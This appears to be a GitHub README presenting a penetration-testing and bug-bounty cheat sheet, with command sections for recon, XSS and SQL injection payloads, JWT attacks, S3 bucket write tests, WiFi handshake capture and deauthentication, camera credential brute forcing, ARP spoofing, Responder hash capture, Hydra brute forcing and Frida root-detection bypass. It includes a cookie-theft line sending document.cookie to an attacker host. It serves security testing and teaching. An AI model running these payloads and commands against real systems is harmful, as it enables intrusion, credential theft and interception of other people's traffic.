# Penetration-testing-toolkit
A comprehensive collection of essential ethical hacking tools, penetration testing commands, and security cheat-sheets for Red Teaming and Web App Pentesting.

# 🛠️ Advanced Pentesting & Bug Bounty Playbook
This repository serves as an operational reference playbook for Web Application Security, Network Auditing, Cloud Infrastructure, and Red Teaming engagements. It contains a highly comprehensive collection of advanced penetration testing commands, automated reconnaissance workflows, IoT/CCTV security auditing guidelines, and live Bug Bounty methodologies curated by **Shubham Patel (techindro)**.

**⚠️ DISCLAIMER:** This repository is strictly for educational purposes, authorized research, and defensive security auditing. Performing unauthorized attacks or scanning networks without explicit, written permission/scope is completely illegal and punishable by law.

---

## 📌 Arsenal Core Blueprint
* [1. Live Bug Bounty Hunting & Automation](#1-live-bug-bounty-hunting--automation)
* [2. Web App Exploitation (XSS & SQL Injection)](#2-web-app-exploitation-xss--sql-injection)
* [3. API Security & Token Manipulation](#3-api-security--token-manipulation)
* [4. Cloud Security Auditing (AWS)](#4-cloud-security-auditing-aws)
* [5. Wireless Auditing (WiFi Hacking)](#5-wireless-auditing-wifi-hacking)
* [6. IoT & CCTV Firmware Security Auditing](#6-iot--cctv-firmware-security-auditing)
* [7. Network Spoofing & MITM Vectors](#7-network-spoofing--mitm-vectors)
* [8. Active Directory & Windows Pentesting](#8-active-directory--windows-pentesting)
* [9. Authentication Attacks & Brute Force](#9-authentication-attacks--brute-force)
* [10. Mobile Sec & KernelSU Next (KSUN)](#10-mobile-sec--kernelsu-next-ksun)

---

## 1. Live Bug Bounty Hunting & Automation
Automate asset discovery, vulnerability scanning, and large-scale enumeration across target scopes on platforms like HackerOne and Bugcrowd.

### Subdomain Recon & Mass Probing
```bash
# Map the attack surface by enumerating subdomains
subfinder -d target.com -o subdomains.txt

# Identify active HTTP/HTTPS servers and pull service titles
httpx -l subdomains.txt -status-code -title -silent -o alive_subs.txt
```

### Automated Template Scanning (Nuclei)
```bash
# Scan targets for specific CVEs and configuration issues
nuclei -l alive_subs.txt -severity high,critical -o nuclei_results.txt
```

### Parameter Discovery for XSS/SQLi/SSRF
```bash
# Pull historic URL data to hunt for vulnerable entry points
waybackurls target.com | grep "\?" | uro > parameters.txt

# Extract hidden parameters and spider paths 
katana -u https://target.com -jc -d 3 -o katana_urls.txt
```

---

## 2. Web App Exploitation (XSS & SQL Injection)

### Cross-Site Scripting (XSS) Payloads
Injecting scripts into input vectors to evaluate context sanitization.
* **Stored/Reflected XSS:** `<svg onload=alert(document.domain)>`
* **DOM-Based XSS:** `javascript:alert(1)` through client-side sinks such as `window.location.hash`.

### SQL Injection (SQLi)
```bash
# Map database structures and extract tables automatically
sqlmap -u "http://target.com" --dbs --batch --random-agent

# Common validation strings for manual auth bypass
' OR '1'='1' --
' UNION SELECT null, username, password FROM users --
```

---

## 3. API Security & Token Manipulation
Testing REST APIs, handling JSON Web Tokens (JWT), and auditing access controls.

### JWT Exploitation
* **None Algorithm Attack:** Set the header to `{"alg":"none"}` and strip the signature to test validation flaws.
* **Secret Key Auditing:**
```bash
# Run signature cracking against local wordlists
jwtcat -t <JWT_TOKEN> -w /usr/share/wordlists/rockyou.txt
```

### API Endpoint Fuzzing
```bash
# Fuzz backend endpoints to find unmapped routing
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com -mc 200,403
```

---

## 4. Cloud Security Auditing (AWS)
Locating misconfigured storage assets, identity exposures, and open public instances.

### Misconfigured S3 Buckets
```bash
# Check for anonymous read access on cloud object storage
aws s3 ls s3://target-bucket-name --no-sign-request

# Verify object write capabilities to test for arbitrary file upload
aws s3 cp test.txt s3://target-bucket-name/test.txt --no-sign-request
```

---

## 5. Wireless Auditing (WiFi Hacking)

### WPA/WPA2 Handshake Capture (Aircrack-ng Suite)
```bash
# Enable monitor mode on the wireless interface
airmon-ng start wlan0
airodump-ng wlan0mon

# Isolate target networks to record authentication handshakes
airodump-ng -c <channel> --bssid <BSSID> -w capture_file wlan0mon

# Issue deauthentication packets to force target reconnects
aireplay-ng -0 10 -a <BSSID> -c <Client-MAC> wlan0mon

# Run local wordlist attacks against the captured handshake file
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture_file-01.cap
```

---

## 6. IoT & CCTV Firmware Security Auditing
Auditing network device interfaces, local file systems, and checking deployment configurations.

### Discovering IoT & Camera Port Vectors
```bash
# Map network streaming and web control access points
nmap -p 554,80,8080 -sV <target-subnet>

# Audit management panels for default administrative credentials
medusa -h <target-ip> -u admin -P default_camera_passwords.txt -M http
```

### Firmware Extraction & Password Searching
```bash
# Unpack filesystem schemas from raw firmware images
binwalk -e firmware.bin

# Scan files for hardcoded configuration strings or private keys
grep -rn "passwd" ./_firmware.bin.extracted/
```

---

## 7. Network Spoofing & MITM Vectors

### ARP Spoofing (Man-In-The-Middle)
```bash
# Configure kernel routing to handle local traffic forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Intercept traffic pathways between target and gateway
arpspoof -i wlan0 -t <Target-IP> <Gateway-IP>
arpspoof -i wlan0 -t <Gateway-IP> <Target-IP>
```

### Session Hijacking via XSS Exfiltration
```javascript
// Route active session attributes to an external logging setup
new Image().src="http://<Attacker-IP>/log?cookie=" + document.cookie;
```

---

## 8. Active Directory & Windows Pentesting
Commands for identity capturing, internal enumeration, and privilege analysis across local enterprise setups.

### LLMNR/NBT-NS Poisoning (Responder)
```bash
# Listen to local network name resolution calls to grab authentication hashes
sudo responder -I eth0 -dwv
```

### Password Cracking (Hashcat)
```bash
# Check captured hashes against custom dictionary rules
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 9. Authentication Attacks & Brute Force

### Web Login Brute-Forcing (Hydra)
```bash
# Test form submission endpoints against dictionary inputs
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
```

### Protocol & Directory Brute-Forcing
```bash
# Audit remote shell endpoints for weak account credentials
hydra -L users.txt -P passwords.txt ssh://<target-ip> -t 4

# Look for unlinked site structures using dictionary lists
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
```

---

## 10. Mobile Sec & KernelSU Next (KSUN)
Bypassing application sandboxing, analyzing local runtimes, and dealing with application defenses during mobile audits.

* **KernelSU Next Integration:** Using SUSFS patches within a test build to prevent instrumentation tools from being flagged by high-security applications.
* **Dynamic Hooking Instrumentation:**
```bash
# Force injection of custom verification overrides at runtime
frida -U -f com.target.app -l bypass_root.js
```

---
**👨‍💻 Maintainer:** [Shubham Patel (techindro)](https://github.com)
